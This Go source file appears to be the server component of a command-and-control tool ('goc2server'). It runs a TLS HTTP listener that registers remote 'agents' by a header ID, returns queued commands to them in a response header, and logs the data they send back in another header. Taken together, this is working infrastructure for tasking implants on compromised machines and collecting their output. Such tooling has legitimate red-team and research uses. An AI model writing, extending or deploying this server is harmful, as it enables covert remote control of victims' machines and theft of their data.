package server

import (
	"fmt"
	"log"
	"net/http"
)

type Server struct {
	DomainName  string
	ListenAddr  string
	CACertFile  string
	CertFile    string
	PrivKeyFile string
	KeyPassFile string
	IDHeader    string
	CmdHeader   string
	DataHeader  string
}

const logFilePath = "./logs/goc2server.log"

func (s *Server) Listen() {
	logFile, _ := s.setFileLogger(logFilePath)
	defer logFile.Close()

	mux := s.getServeMux()

	srv := &http.Server{
		Addr:      s.ListenAddr,
		Handler:   mux,
		TLSConfig: s.getTLSConfig(),
	}

	log.Printf("starting the server on %s", s.ListenAddr)

	if err := srv.ListenAndServeTLS("", ""); err != nil {
		log.Fatalf("error listening on port: %v", err)
	}
}

func (s *Server) getServeMux() (mux *http.ServeMux) {
	mux = http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
		db := getDB()
		defer db.Close()

		agentID := req.Header.Get(s.IDHeader)
		agentData := req.Header.Get(s.DataHeader)

		getAgent(db, agentID)

		cmd := getAgentCmd(agentID)
		if cmd != "" {
			w.Header().Set(s.CmdHeader, cmd)
			log.Printf("%s header set with value %s", s.CmdHeader, cmd)
		}

		logStr := fmt.Sprintf("IP: %s | Path: %s", req.RemoteAddr, req.URL.Path)
		if agentID != "" {
			if !agentExists(db, agentID) {
				createAgent(db, DBAgent{
					id:        agentID,
					createdAt: "now",
					updatedAt: "none",
				})
			}
			logStr += fmt.Sprintf(" | ClientID: %s", agentID)
		}

		if agentData != "" {
			updateAgentCmd(db, DBCommand{})
			logStr += fmt.Sprintf(" | Data: %s", agentData)
		}
		log.Print(logStr)
		fmt.Fprint(w, "")
	})
	return
}
